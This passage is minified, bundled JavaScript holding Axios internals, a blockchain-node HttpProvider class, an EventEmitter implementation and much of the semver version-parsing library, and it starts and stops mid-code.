        const t = this._listeners.indexOf(e);
        t !== -1 && this._listeners.splice(t, 1)
    }
    toAbortSignal() {
        const e = new AbortController
          , t = o => {
            e.abort(o)
        }
        ;
        return this.subscribe(t),
        e.signal.unsubscribe = () => this.unsubscribe(t),
        e.signal
    }
    static source() {
        let e;
        return {
            token: new dU(function(i) {
                e = i
            }
            ),
            cancel: e
        }
    }
}
;
function q0e(r) {
    return function(t) {
        return r.apply(null, t)
    }
}
function V0e(r) {
    return Oe.isObject(r) && r.isAxiosError === !0
}
const FA = {
    Continue: 100,
    SwitchingProtocols: 101,
    Processing: 102,
    EarlyHints: 103,
    Ok: 200,
    Created: 201,
    Accepted: 202,
    NonAuthoritativeInformation: 203,
    NoContent: 204,
    ResetContent: 205,
    PartialContent: 206,
    MultiStatus: 207,
    AlreadyReported: 208,
    ImUsed: 226,
    MultipleChoices: 300,
    MovedPermanently: 301,
    Found: 302,
    SeeOther: 303,
    NotModified: 304,
    UseProxy: 305,
    Unused: 306,
    TemporaryRedirect: 307,
    PermanentRedirect: 308,
    BadRequest: 400,
    Unauthorized: 401,
    PaymentRequired: 402,
    Forbidden: 403,
    NotFound: 404,
    MethodNotAllowed: 405,
    NotAcceptable: 406,
    ProxyAuthenticationRequired: 407,
    RequestTimeout: 408,
    Conflict: 409,
    Gone: 410,
    LengthRequired: 411,
    PreconditionFailed: 412,
    PayloadTooLarge: 413,
    UriTooLong: 414,
    UnsupportedMediaType: 415,
    RangeNotSatisfiable: 416,
    ExpectationFailed: 417,
    ImATeapot: 418,
    MisdirectedRequest: 421,
    UnprocessableEntity: 422,
    Locked: 423,
    FailedDependency: 424,
    TooEarly: 425,
    UpgradeRequired: 426,
    PreconditionRequired: 428,
    TooManyRequests: 429,
    RequestHeaderFieldsTooLarge: 431,
    UnavailableForLegalReasons: 451,
    InternalServerError: 500,
    NotImplemented: 501,
    BadGateway: 502,
    ServiceUnavailable: 503,
    GatewayTimeout: 504,
    HttpVersionNotSupported: 505,
    VariantAlsoNegotiates: 506,
    InsufficientStorage: 507,
    LoopDetected: 508,
    NotExtended: 510,
    NetworkAuthenticationRequired: 511
};
Object.entries(FA).forEach( ([r,e]) => {
    FA[e] = r
}
);
function hU(r) {
    const e = new iu(r)
      , t = qF(iu.prototype.request, e);
    return Oe.extend(t, iu.prototype, e, {
        allOwnKeys: !0
    }),
    Oe.extend(t, e, null, {
        allOwnKeys: !0
    }),
    t.create = function(i) {
        return hU(bu(r, i))
    }
    ,
    t
}
const on = hU(D0);
on.Axios = iu;
on.CanceledError = oh;
on.CancelToken = j0e;
on.isCancel = oU;
on.VERSION = fU;
on.toFormData = ax;
on.AxiosError = Ut;
on.Cancel = on.CanceledError;
on.all = function(e) {
    return Promise.all(e)
}
;
on.spread = q0e;
on.isAxiosError = V0e;
on.mergeConfig = bu;
on.AxiosHeaders = Lo;
on.formToJSON = r => nU(Oe.isHTMLForm(r) ? new FormData(r) : r);
on.getAdapter = uU.getAdapter;
on.HttpStatusCode = FA;
on.default = on;
const {Axios: G1e, AxiosError: K1e, CanceledError: Z1e, isCancel: Y1e, CancelToken: X1e, VERSION: J1e, all: Q1e, Cancel: exe, isAxiosError: txe, spread: rxe, toFormData: nxe, AxiosHeaders: oxe, HttpStatusCode: ixe, formToJSON: sxe, getAdapter: axe, mergeConfig: cxe} = on;
class pU {
    constructor(e, t=3e4, o="", i="", n={}, s="/") {
        we(this, "host");
        we(this, "timeout");
        we(this, "user");
        we(this, "password");
        we(this, "headers");
        we(this, "statusPage");
        we(this, "instance");
        if (!G3(e))
            throw new Error("Invalid URL provided to HttpProvider");
        if (isNaN(t) || t < 0)
            throw new Error("Invalid timeout duration provided");
        if (!B0(n))
            throw new Error("Invalid headers object provided");
        e = e.replace(/\/+$/, ""),
        this.host = e,
        this.timeout = t,
        this.user = o,
        this.password = i,
        this.headers = n,
        this.statusPage = s,
        this.instance = on.create({
            baseURL: e,
            timeout: t,
            headers: n,
            auth: o ? {
                username: o,
                password: i
            } : void 0
        })
    }
    setStatusPage(e="/") {
        this.statusPage = e
    }
    async isConnected(e=this.statusPage) {
        return this.request(e).then(t => ZD(t, "blockID", "block_header")).catch( () => !1)
    }
    request(e, t={}, o="get") {
        return o = o.toLowerCase(),
        this.instance.request({
            data: o == "post" && Object.keys(t).length ? t : null,
            params: o == "get" && t,
            url: e,
            method: o
        }).then( ({data: i}) => i)
    }
}
const ei = {
    HttpProvider: pU
};
var Q2 = {
    exports: {}
}, g5;
function H0e() {
    return g5 || (g5 = 1,
    function(r) {
        var e = Object.prototype.hasOwnProperty
          , t = "~";
        function o() {}
        Object.create && (o.prototype = Object.create(null),
        new o().__proto__ || (t = !1));
        function i(l, f, h) {
            this.fn = l,
            this.context = f,
            this.once = h || !1
        }
        function n(l, f, h, p, b) {
            if (typeof h != "function")
                throw new TypeError("The listener must be a function");
            var v = new i(h,p || l,b)
              , T = t ? t + f : f;
            return l._events[T] ? l._events[T].fn ? l._events[T] = [l._events[T], v] : l._events[T].push(v) : (l._events[T] = v,
            l._eventsCount++),
            l
        }
        function s(l, f) {
            --l._eventsCount === 0 ? l._events = new o : delete l._events[f]
        }
        function a() {
            this._events = new o,
            this._eventsCount = 0
        }
        a.prototype.eventNames = function() {
            var f = [], h, p;
            if (this._eventsCount === 0)
                return f;
            for (p in h = this._events)
                e.call(h, p) && f.push(t ? p.slice(1) : p);
            return Object.getOwnPropertySymbols ? f.concat(Object.getOwnPropertySymbols(h)) : f
        }
        ,
        a.prototype.listeners = function(f) {
            var h = t ? t + f : f
              , p = this._events[h];
            if (!p)
                return [];
            if (p.fn)
                return [p.fn];
            for (var b = 0, v = p.length, T = new Array(v); b < v; b++)
                T[b] = p[b].fn;
            return T
        }
        ,
        a.prototype.listenerCount = function(f) {
            var h = t ? t + f : f
              , p = this._events[h];
            return p ? p.fn ? 1 : p.length : 0
        }
        ,
        a.prototype.emit = function(f, h, p, b, v, T) {
            var x = t ? t + f : f;
            if (!this._events[x])
                return !1;
            var E = this._events[x], B = arguments.length, P, O;
            if (E.fn) {
                switch (E.once && this.removeListener(f, E.fn, void 0, !0),
                B) {
                case 1:
                    return E.fn.call(E.context),
                    !0;
                case 2:
                    return E.fn.call(E.context, h),
                    !0;
                case 3:
                    return E.fn.call(E.context, h, p),
                    !0;
                case 4:
                    return E.fn.call(E.context, h, p, b),
                    !0;
                case 5:
                    return E.fn.call(E.context, h, p, b, v),
                    !0;
                case 6:
                    return E.fn.call(E.context, h, p, b, v, T),
                    !0
                }
                for (O = 1,
                P = new Array(B - 1); O < B; O++)
                    P[O - 1] = arguments[O];
                E.fn.apply(E.context, P)
            } else {
                var F = E.length, D;
                for (O = 0; O < F; O++)
                    switch (E[O].once && this.removeListener(f, E[O].fn, void 0, !0),
                    B) {
                    case 1:
                        E[O].fn.call(E[O].context);
                        break;
                    case 2:
                        E[O].fn.call(E[O].context, h);
                        break;
                    case 3:
                        E[O].fn.call(E[O].context, h, p);
                        break;
                    case 4:
                        E[O].fn.call(E[O].context, h, p, b);
                        break;
                    default:
                        if (!P)
                            for (D = 1,
                            P = new Array(B - 1); D < B; D++)
                                P[D - 1] = arguments[D];
                        E[O].fn.apply(E[O].context, P)
                    }
            }
            return !0
        }
        ,
        a.prototype.on = function(f, h, p) {
            return n(this, f, h, p, !1)
        }
        ,
        a.prototype.once = function(f, h, p) {
            return n(this, f, h, p, !0)
        }
        ,
        a.prototype.removeListener = function(f, h, p, b) {
            var v = t ? t + f : f;
            if (!this._events[v])
                return this;
            if (!h)
                return s(this, v),
                this;
            var T = this._events[v];
            if (T.fn)
                T.fn === h && (!b || T.once) && (!p || T.context === p) && s(this, v);
            else {
                for (var x = 0, E = [], B = T.length; x < B; x++)
                    (T[x].fn !== h || b && !T[x].once || p && T[x].context !== p) && E.push(T[x]);
                E.length ? this._events[v] = E.length === 1 ? E[0] : E : s(this, v)
            }
            return this
        }
        ,
        a.prototype.removeAllListeners = function(f) {
            var h;
            return f ? (h = t ? t + f : f,
            this._events[h] && s(this, h)) : (this._events = new o,
            this._eventsCount = 0),
            this
        }
        ,
        a.prototype.off = a.prototype.removeListener,
        a.prototype.addListener = a.prototype.on,
        a.prefixed = t,
        a.EventEmitter = a,
        r.exports = a
    }(Q2)),
    Q2.exports
}
var G0e = H0e();
const K0e = Zc(G0e);
var dm = {
    exports: {}
}, eT, y5;
function ux() {
    if (y5)
        return eT;
    y5 = 1;
    const r = "2.0.0"
      , e = 256
      , t = Number.MAX_SAFE_INTEGER || 9007199254740991
      , o = 16
      , i = e - 6;
    return eT = {
        MAX_LENGTH: e,
        MAX_SAFE_COMPONENT_LENGTH: o,
        MAX_SAFE_BUILD_LENGTH: i,
        MAX_SAFE_INTEGER: t,
        RELEASE_TYPES: ["major", "premajor", "minor", "preminor", "patch", "prepatch", "prerelease"],
        SEMVER_SPEC_VERSION: r,
        FLAG_INCLUDE_PRERELEASE: 1,
        FLAG_LOOSE: 2
    },
    eT
}
var tT, b5;
function fx() {
    if (b5)
        return tT;
    b5 = 1;
    var r = {};
    return tT = typeof process == "object" && r && r.NODE_DEBUG && /\bsemver\b/i.test(r.NODE_DEBUG) ? (...t) => console.error("SEMVER", ...t) : () => {}
    ,
    tT
}
var m5;
function F0() {
    return m5 || (m5 = 1,
    function(r, e) {
        const {MAX_SAFE_COMPONENT_LENGTH: t, MAX_SAFE_BUILD_LENGTH: o, MAX_LENGTH: i} = ux()
          , n = fx();
        e = r.exports = {};
        const s = e.re = []
          , a = e.safeRe = []
          , l = e.src = []
          , f = e.safeSrc = []
          , h = e.t = {};
        let p = 0;
        const b = "[a-zA-Z0-9-]"
          , v = [["\\s", 1], ["\\d", i], [b, o]]
          , T = E => {
            for (const [B,P] of v)
                E = E.split(`${B}*`).join(`${B}{0,${P}}`).split(`${B}+`).join(`${B}{1,${P}}`);
            return E
        }
          , x = (E, B, P) => {
            const O = T(B)
              , F = p++;
            n(E, F, B),
            h[E] = F,
            l[F] = B,
            f[F] = O,
            s[F] = new RegExp(B,P ? "g" : void 0),
            a[F] = new RegExp(O,P ? "g" : void 0)
        }
        ;
        x("NUMERICIDENTIFIER", "0|[1-9]\\d*"),
        x("NUMERICIDENTIFIERLOOSE", "\\d+"),
        x("NONNUMERICIDENTIFIER", `\\d*[a-zA-Z-]${b}*`),
        x("MAINVERSION", `(${l[h.NUMERICIDENTIFIER]})\\.(${l[h.NUMERICIDENTIFIER]})\\.(${l[h.NUMERICIDENTIFIER]})`),
        x("MAINVERSIONLOOSE", `(${l[h.NUMERICIDENTIFIERLOOSE]})\\.(${l[h.NUMERICIDENTIFIERLOOSE]})\\.(${l[h.NUMERICIDENTIFIERLOOSE]})`),
        x("PRERELEASEIDENTIFIER", `(?:${l[h.NUMERICIDENTIFIER]}|${l[h.NONNUMERICIDENTIFIER]})`),
        x("PRERELEASEIDENTIFIERLOOSE", `(?:${l[h.NUMERICIDENTIFIERLOOSE]}|${l[h.NONNUMERICIDENTIFIER]})`),
        x("PRERELEASE", `(?:-(${l[h.PRERELEASEIDENTIFIER]}(?:\\.${l[h.PRERELEASEIDENTIFIER]})*))`),
        x("PRERELEASELOOSE", `(?:-?(${l[h.PRERELEASEIDENTIFIERLOOSE]}(?:\\.${l[h.PRERELEASEIDENTIFIERLOOSE]})*))`),
        x("BUILDIDENTIFIER", `${b}+`),
        x("BUILD", `(?:\\+(${l[h.BUILDIDENTIFIER]}(?:\\.${l[h.BUILDIDENTIFIER]})*))`),
        x("FULLPLAIN", `v?${l[h.MAINVERSION]}${l[h.PRERELEASE]}?${l[h.BUILD]}?`),
        x("FULL", `^${l[h.FULLPLAIN]}$`),
        x("LOOSEPLAIN", `[v=\\s]*${l[h.MAINVERSIONLOOSE]}${l[h.PRERELEASELOOSE]}?${l[h.BUILD]}?`),
        x("LOOSE", `^${l[h.LOOSEPLAIN]}$`),
        x("GTLT", "((?:<|>)?=?)"),
        x("XRANGEIDENTIFIERLOOSE", `${l[h.NUMERICIDENTIFIERLOOSE]}|x|X|\\*`),
        x("XRANGEIDENTIFIER", `${l[h.NUMERICIDENTIFIER]}|x|X|\\*`),
        x("XRANGEPLAIN", `[v=\\s]*(${l[h.XRANGEIDENTIFIER]})(?:\\.(${l[h.XRANGEIDENTIFIER]})(?:\\.(${l[h.XRANGEIDENTIFIER]})(?:${l[h.PRERELEASE]})?${l[h.BUILD]}?)?)?`),
        x("XRANGEPLAINLOOSE", `[v=\\s]*(${l[h.XRANGEIDENTIFIERLOOSE]})(?:\\.(${l[h.XRANGEIDENTIFIERLOOSE]})(?:\\.(${l[h.XRANGEIDENTIFIERLOOSE]})(?:${l[h.PRERELEASELOOSE]})?${l[h.BUILD]}?)?)?`),
        x("XRANGE", `^${l[h.GTLT]}\\s*${l[h.XRANGEPLAIN]}$`),
        x("XRANGELOOSE", `^${l[h.GTLT]}\\s*${l[h.XRANGEPLAINLOOSE]}$`),
        x("COERCEPLAIN", `(^|[^\\d])(\\d{1,${t}})(?:\\.(\\d{1,${t}}))?(?:\\.(\\d{1,${t}}))?`),
        x("COERCE", `${l[h.COERCEPLAIN]}(?:$|[^\\d])`),
        x("COERCEFULL", l[h.COERCEPLAIN] + `(?:${l[h.PRERELEASE]})?(?:${l[h.BUILD]})?(?:$|[^\\d])`),
        x("COERCERTL", l[h.COERCE], !0),
        x("COERCERTLFULL", l[h.COERCEFULL], !0),
        x("LONETILDE", "(?:~>?)"),
        x("TILDETRIM", `(\\s*)${l[h.LONETILDE]}\\s+`, !0),
        e.tildeTrimReplace = "$1~",
        x("TILDE", `^${l[h.LONETILDE]}${l[h.XRANGEPLAIN]}$`),
        x("TILDELOOSE", `^${l[h.LONETILDE]}${l[h.XRANGEPLAINLOOSE]}$`),
        x("LONECARET", "(?:\\^)"),
        x("CARETTRIM", `(\\s*)${l[h.LONECARET]}\\s+`, !0),
        e.caretTrimReplace = "$1^",
        x("CARET", `^${l[h.LONECARET]}${l[h.XRANGEPLAIN]}$`),
        x("CARETLOOSE", `^${l[h.LONECARET]}${l[h.XRANGEPLAINLOOSE]}$`),
        x("COMPARATORLOOSE", `^${l[h.GTLT]}\\s*(${l[h.LOOSEPLAIN]})$|^$`),
        x("COMPARATOR", `^${l[h.GTLT]}\\s*(${l[h.FULLPLAIN]})$|^$`),
        x("COMPARATORTRIM", `(\\s*)${l[h.GTLT]}\\s*(${l[h.LOOSEPLAIN]}|${l[h.XRANGEPLAIN]})`, !0),
        e.comparatorTrimReplace = "$1$2$3",
        x("HYPHENRANGE", `^\\s*(${l[h.XRANGEPLAIN]})\\s+-\\s+(${l[h.XRANGEPLAIN]})\\s*$`),
        x("HYPHENRANGELOOSE", `^\\s*(${l[h.XRANGEPLAINLOOSE]})\\s+-\\s+(${l[h.XRANGEPLAINLOOSE]})\\s*$`),
        x("STAR", "(<|>)?=?\\s*\\*"),
        x("GTE0", "^\\s*>=\\s*0\\.0\\.0\\s*$"),
        x("GTE0PRE", "^\\s*>=\\s*0\\.0\\.0-0\\s*$")
    }(dm, dm.exports)),
    dm.exports
}
var rT, x5;
function m4() {
    if (x5)
        return rT;
    x5 = 1;
    const r = Object.freeze({
        loose: !0
    })
      , e = Object.freeze({});
    return rT = o => o ? typeof o != "object" ? r : o : e,
    rT
}
var nT, w5;
function gU() {
    if (w5)
        return nT;
    w5 = 1;
    const r = /^[0-9]+$/
      , e = (o, i) => {
        const n = r.test(o)
          , s = r.test(i);
        return n && s && (o = +o,
        i = +i),
        o === i ? 0 : n && !s ? -1 : s && !n ? 1 : o < i ? -1 : 1
    }
    ;
    return nT = {
        compareIdentifiers: e,
        rcompareIdentifiers: (o, i) => e(i, o)
    },
    nT
}
var oT, v5;
function vo() {
    if (v5)
        return oT;
    v5 = 1;
    const r = fx()
      , {MAX_LENGTH: e, MAX_SAFE_INTEGER: t} = ux()
      , {safeRe: o, safeSrc: i, t: n} = F0()
      , s = m4()
      , {compareIdentifiers: a} = gU();
    class l {
        constructor(h, p) {
            if (p = s(p),
            h instanceof l) {
                if (h.loose === !!p.loose && h.includePrerelease === !!p.includePrerelease)
                    return h;
                h = h.version
            } else if (typeof h != "string")
                throw new TypeError(`Invalid version. Must be a string. Got type "${typeof h}".`);
            if (h.length > e)
                throw new TypeError(`version is longer than ${e} characters`);
            r("SemVer", h, p),
            this.options = p,
            this.loose = !!p.loose,
            this.includePrerelease = !!p.includePrerelease;
            const b = h.trim().match(p.loose ? o[n.LOOSE] : o[n.FULL]);
            if (!b)
                throw new TypeError(`Invalid Version: ${h}`);
            if (this.raw = h,
            this.major = +b[1],
            this.minor = +b[2],
            this.patch = +b[3],
            this.major > t || this.major < 0)
                throw new TypeError("Invalid major version");
            if (this.minor > t || this.minor < 0)
                throw new TypeError("Invalid minor version");
            if (this.patch > t || this.patch < 0)
                throw new TypeError("Invalid patch version");
            b[4] ? this.prerelease = b[4].split(".").map(v => {
                if (/^[0-9]+$/.test(v)) {
                    const T = +v;
                    if (T >= 0 && T < t)
                        return T
                }
                return v
            }
            ) : this.prerelease = [],
            this.build = b[5] ? b[5].split(".") : [],
            this.format()
        }
        format() {
            return this.version = `${this.major}.${this.minor}.${this.patch}`,
            this.prerelease.length && (this.version += `-${this.prerelease.join(".")}`),
            this.version
        }
        toString() {
            return this.version
        }
        compare(h) {
            if (r("SemVer.compare", this.version, this.options, h),
            !(h instanceof l)) {
                if (typeof h == "string" && h === this.version)
                    return 0;
                h = new l(h,this.options)
            }
            return h.version === this.version ? 0 : this.compareMain(h) || this.comparePre(h)
        }
        compareMain(h) {
            return h instanceof l || (h = new l(h,this.options)),
            a(this.major, h.major) || a(this.minor, h.minor) || a(this.patch, h.patch)
        }
        comparePre(h) {
            if (h instanceof l || (h = new l(h,this.options)),
            this.prerelease.length && !h.prerelease.length)
                return -1;
            if (!this.prerelease.length && h.prerelease.length)
                return 1;
            if (!this.prerelease.length && !h.prerelease.length)
                return 0;
            let p = 0;
            do {
                const b = this.prerelease[p]
                  , v = h.prerelease[p];
                if (r("prerelease compare", p, b, v),
                b === void 0 && v === void 0)
                    return 0;
                if (v === void 0)
                    return 1;
                if (b === void 0)
                    return -1;
                if (b === v)
                    continue;
                return a(b, v)
            } while (++p)
        }
        compareBuild(h) {
            h instanceof l || (h = new l(h,this.options));
            let p = 0;
            do {
                const b = this.build[p]
                  , v = h.build[p];
                if (r("build compare", p, b, v),
                b === void 0 && v === void 0)
                    return 0;
                if (v === void 0)
                    return 1;
                if (b === void 0)
                    return -1;
                if (b === v)
                    continue;
                return a(b, v)
            } while (++p)
        }
        inc(h, p, b) {
            if (h.startsWith("pre")) {
                if (!p && b === !1)
                    throw new Error("invalid increment argument: identifier is empty");
                if (p) {
                    const v = new RegExp(`^${this.options.loose ? i[n.PRERELEASELOOSE] : i[n.PRERELEASE]}$`)
                      , T = `-${p}`.match(v);
                    if (!T || T[1] !== p)
                        throw new Error(`invalid identifier: ${p}`)
                }
            }
            switch (h) {
            case "premajor":
                this.prerelease.length = 0,
                this.patch = 0,
                this.minor = 0,
                this.major++,
                this.inc("pre", p, b);
                break;
            case "preminor":
                this.prerelease.length = 0,
                this.patch = 0,
                this.minor++,
                this.inc("pre", p, b);
                break;
            case "prepatch":
                this.prerelease.length = 0,
                this.inc("patch", p, b),
                this.inc("pre", p, b);
                break;
            case "prerelease":
                this.prerelease.length === 0 && this.inc("patch", p, b),
                this.inc("pre", p, b);
                break;
            case "release":
                if (this.prerelease.length === 0)
                    throw new Error(`version ${this.raw} is not a prerelease`);
                this.prerelease.length = 0;
                break;
            case "major":
                (this.minor !== 0 || this.patch !== 0 || this.prerelease.length === 0) && this.major++,
                this.minor = 0,
                this.patch = 0,
                this.prerelease = [];
                break;
            case "minor":
                (this.patch !== 0 || this.prerelease.length === 0) && this.minor++,
                this.patch = 0,
                this.prerelease = [];
                break;
            case "patch":
                this.prerelease.length === 0 && this.patch++,
                this.prerelease = [];
                break;
            case "pre":
                {
                    const v = Number(b) ? 1 : 0;
                    if (this.prerelease.length === 0)
                        this.prerelease = [v];
                    else {
                        let T = this.prerelease.length;
                        for (; --T >= 0; )
                            typeof this.prerelease[T] == "number" && (this.prerelease[T]++,
                            T = -2);
                        if (T === -1) {
                            if (p === this.prerelease.join(".") && b === !1)
                                throw new Error("invalid increment argument: identifier already exists");
                            this.prerelease.push(v)
                        }
                    }
                    if (p) {
                        let T = [p, v];
                        b === !1 && (T = [p]),
                        a(this.prerelease[0], p) === 0 ? isNaN(this.prerelease[1]) && (this.prerelease = T) : this.prerelease = T
                    }
                    break
                }
            default:
                throw new Error(`invalid increment argument: ${h}`)
            }
            return this.raw = this.format(),
            this.build.length && (this.raw += `+${this.build.join(".")}`),
            this
        }
    }
    return oT = l,
    oT
}
var iT, T5;
function ih() {
    if (T5)
        return iT;
    T5 = 1;
    const r = vo();
    return iT = (t, o, i=!1) => {
        if (t instanceof r)
            return t;
        try {
            return new r(t,o)
        } catch (n) {
            if (!i)
                return null;
            throw n
        }
    }
    ,
    iT
}
var sT, E5;
function Z0e() {
    if (E5)
        return sT;
    E5 = 1;
    const r = ih();
    return sT = (t, o) => {
        const i = r(t, o);
        return i ? i.version : null
    }
    ,
    sT
}
var aT, A5;
function Y0e() {
    if (A5)
        return aT;
    A5 = 1;
    const r = ih();
    return aT = (t, o) => {
        const i = r(t.trim().replace(/^[=v]+/, ""), o);
        return i ? i.version : null
    }
    ,
    aT
}
var cT, P5;
function X0e() {
    if (P5)
        return cT;
    P5 = 1;
    const r = vo();
    return cT = (t, o, i, n, s) => {
        typeof i == "string" && (s = n,
        n = i,
        i = void 0);
        try {
            return new r(t instanceof r ? t.version : t,i).inc(o, n, s).version
        } catch {
            return null
        }
    }
    ,
    cT
}
var lT, C5;
function J0e() {
    if (C5)
        return lT;
    C5 = 1;
    const r = ih();
    return lT = (t, o) => {
        const i = r(t, null, !0)
          , n = r(o, null, !0)
          , s = i.compare(n);
        if (s === 0)
            return null;
        const a = s > 0
          , l = a ? i : n
          , f = a ? n : i
          , h = !!l.prerelease.length;
        if (!!f.prerelease.length && !h) {
            if (!f.patch && !f.minor)
                return "major";
            if (f.compareMain(l) === 0)
                return f.minor && !f.patch ? "minor" : "patch"
        }
        const b = h ? "pre" : "";
        return i.major !== n.major ? b + "major" : i.minor !== n.minor ? b + "minor" : i.patch !== n.patch ? b + "patch" : "prerelease"
    }
    ,
    lT
}
var uT, S5;
function Q0e() {
    if (S5)
        return uT;
    S5 = 1;
    const r = vo();
    return uT = (t, o) => new r(t,o).major,
    uT
}
var fT, B5;
function ege() {
    if (B5)
        return fT;
    B5 = 1;
    const r = vo();
    return fT = (t, o) => new r(t,o).minor,
    fT
}
var dT, _5;
function tge() {
    if (_5)
        return dT;
    _5 = 1;
    const r = vo();
    return dT = (t, o) => new r(t,o).patch,
    dT
}
var hT, I5;
function rge() {
    if (I5)
        return hT;
    I5 = 1;
    const r = ih();
    return hT = (t, o) => {
        const i = r(t, o);
        return i && i.prerelease.length ? i.prerelease : null
    }
    ,
    hT
}
var pT, O5;
function ps() {
    if (O5)
        return pT;
    O5 = 1;
    const r = vo();
    return pT = (t, o, i) => new r(t,i).compare(new r(o,i)),
    pT
}
var gT, R5;
function nge() {
    if (R5)
        return gT;
    R5 = 1;
    const r = ps();
    return gT = (t, o, i) => r(o, t, i),
    gT
}
var yT, W5;
function oge() {
    if (W5)
        return yT;
    W5 = 1;
    const r = ps();
    return yT = (t, o) => r(t, o, !0),
    yT
}
var bT, M5;
function x4() {
    if (M5)
        return bT;
    M5 = 1;
    const r = vo();
    return bT = (t, o, i) => {
        const n = new r(t,i)
          , s = new r(o,i);
        return n.compare(s) || n.compareBuild(s)
    }
    ,
    bT
}
var mT, N5;
function ige() {
    if (N5)
        return mT;
    N5 = 1;
    const r = x4();
    return mT = (t, o) => t.sort( (i, n) => r(i, n, o)),
    mT
}
var xT, D5;
function sge() {
    if (D5)
        return xT;
    D5 = 1;
    const r = x4();
    return xT = (t, o) => t.sort( (i, n) => r(n, i, o)),
    xT
}
var wT, F5;
function dx() {
    if (F5)
        return wT;
    F5 = 1;
    const r = ps();
    return wT = (t, o, i) => r(t, o, i) > 0,
    wT
}
var vT, U5;
function w4() {
    if (U5)
        return vT;
    U5 = 1;
    const r = ps();
    return vT = (t, o, i) => r(t, o, i) < 0,
    vT
}
var TT, k5;
function yU() {
    if (k5)
        return TT;
    k5 = 1;
    const r = ps();
    return TT = (t, o, i) => r(t, o, i) === 0,
    TT
}
var ET, L5;
function bU() {
    if (L5)
        return ET;
    L5 = 1;
    const r = ps();
    return ET = (t, o, i) => r(t, o, i) !== 0,
    ET
}
var AT, $5;
function v4() {
    if ($5)
        return AT;
    $5 = 1;
    const r = ps();
    return AT = (t, o, i) => r(t, o, i) >= 0,
    AT
}
var PT, z5;
function T4() {
    if (z5)
        return PT;
    z5 = 1;
    const r = ps();
    return PT = (t, o, i) => r(t, o, i) <= 0,
    PT
}
var CT, j5;
function mU() {
    if (j5)
        return CT;
    j5 = 1;
    const r = yU()
      , e = bU()
      , t = dx()
      , o = v4()
      , i = w4()
      , n = T4();
    return CT = (a, l, f, h) => {
        switch (l) {
        case "===":
            return typeof a == "object" && (a = a.version),
            typeof f == "object" && (f = f.version),
            a === f;
        case "!==":
            return typeof a == "object" && (a = a.version),
            typeof f == "object" && (f = f.version),
            a !== f;
        case "":
        case "=":
        case "==":
            return r(a, f, h);
        case "!=":
            return e(a, f, h);
        case ">":
            return t(a, f, h);
        case ">=":
            return o(a, f, h);
        case "<":
            return i(a, f, h);
        case "<=":
            return n(a, f, h);
        default:
            throw new TypeError(`Invalid operator: ${l}`)
        }
    }
    ,
    CT
}
var ST, q5;
function age() {
    if (q5)
        return ST;
    q5 = 1;
    const r = vo()
      , e = ih()
      , {safeRe: t, t: o} = F0();
    return ST = (n, s) => {
        if (n instanceof r)
            return n;
        if (typeof n == "number" && (n = String(n)),
        typeof n != "string")
            return null;
        s = s || {};
        let a = null;
        if (!s.rtl)
            a = n.match(s.includePrerelease ? t[o.COERCEFULL] : t[o.COERCE]);
        else {
            const v = s.includePrerelease ? t[o.COERCERTLFULL] : t[o.COERCERTL];
            let T;
            for (; (T = v.exec(n)) && (!a || a.index + a[0].length !== n.length); )
                (!a || T.index + T[0].length !== a.index + a[0].length) && (a = T),
                v.lastIndex = T.index + T[1].length + T[2].length;
            v.lastIndex = -1
        }
        if (a === null)
            return null;
        const l = a[2]
          , f = a[3] || "0"
          , h = a[4] || "0"
          , p = s.includePrerelease && a[5] ? `-${a[5]}` : ""
          , b = s.includePrerelease && a[6] ? `+${a[6]}` : "";
        return e(`${l}.${f}.${h}${p}${b}`, s)
    }
    ,
    ST
}
var BT, V5;
function cge() {
    if (V5)
        return BT;
    V5 = 1;
    class r {
        constructor() {
            this.max = 1e3,
            this.map = new Map
        }
        get(t) {
            const o = this.map.get(t);
            if (o !== void 0)
                return this.map.delete(t),
                this.map.set(t, o),
                o
        }
        delete(t) {
            return this.map.delete(t)
        }
        set(t, o) {
            if (!this.delete(t) && o !== void 0) {
                if (this.map.size >= this.max) {
                    const n = this.map.keys().next().value;
                    this.delete(n)
                }
                this.map.set(t, o)
            }
            return this
        }
    }
    return BT = r,
    BT
}
var _T, H5;
function gs() {
    if (H5)
        return _T;
    H5 = 1;
    const r = /\s+/g;
    class e {
        constructor(R, _) {
            if (_ = i(_),
            R instanceof e)
                return R.loose === !!_.loose && R.includePrerelease === !!_.includePrerelease ? R : new e(R.raw,_);
            if (R instanceof n)
                return this.raw = R.value,
                this.set = [[R]],
                this.formatted = void 0,
                this;
            if (this.options = _,
            this.loose = !!_.loose,
            this.includePrerelease = !!_.includePrerelease,
            this.raw = R.trim().replace(r, " "),
            this.set = this.raw.split("||").map($ => this.parseRange($.trim())).filter($ => $.length),
            !this.set.length)
                throw new TypeError(`Invalid SemVer Range: ${this.raw}`);
            if (this.set.length > 1) {
                const $ = this.set[0];
                if (this.set = this.set.filter(z => !x(z[0])),
                this.set.length === 0)
                    this.set = [$];
                else if (this.set.length > 1) {
                    for (const z of this.set)
                        if (z.length === 1 && E(z[0])) {
                            this.set = [z];
                            break
                        }
                }
            }
            this.formatted = void 0
        }
        get range() {
            if (this.formatted === void 0) {
                this.formatted = "";
                for (let R = 0; R < this.set.length; R++) {
                    R > 0 && (this.formatted += "||");
                    const _ = this.set[R];
                    for (let $ = 0; $ < _.length; $++)
                        $ > 0 && (this.formatted += " "),
                        this.formatted += _[$].toString().trim()
                }
            }
            return this.formatted
        }
        format() {
            return this.range
        }
        toString() {
            return this.range
        }
        parseRange(R) {
            const $ = ((this.options.includePrerelease && v) | (this.options.loose && T)) + ":" + R
              , z = o.get($);
            if (z)
                return z;
            const K = this.options.loose
              , j = K ? l[f.HYPHENRANGELOOSE] : l[f.HYPHENRANGE];
            R = R.replace(j, X(this.options.includePrerelease)),
            s("hyphen replace", R),
            R = R.replace(l[f.COMPARATORTRIM], h),
            s("comparator trim", R),
            R = R.replace(l[f.TILDETRIM], p),
            s("tilde trim", R),
            R = R.replace(l[f.CARETTRIM], b),
            s("caret trim", R);
            let ee = R.split(" ").map(me => P(me, this.options)).join(" ").split(/\s+/).map(me => H(me, this.options));
            K && (ee = ee.filter(me => (s("loose invalid filter", me, this.options),
            !!me.match(l[f.COMPARATORLOOSE])))),
            s("range list", ee);
            const ie = new Map
              , ae = ee.map(me => new n(me,this.options));
            for (const me of ae) {
                if (x(me))
                    return [me];
                ie.set(me.value, me)
            }
            ie.size > 1 && ie.has("") && ie.delete("");
            const he = [...ie.values()];
            return o.set($, he),
            he
        }
        intersects(R, _) {
            if (!(R instanceof e))
                throw new TypeError("a Range is required");
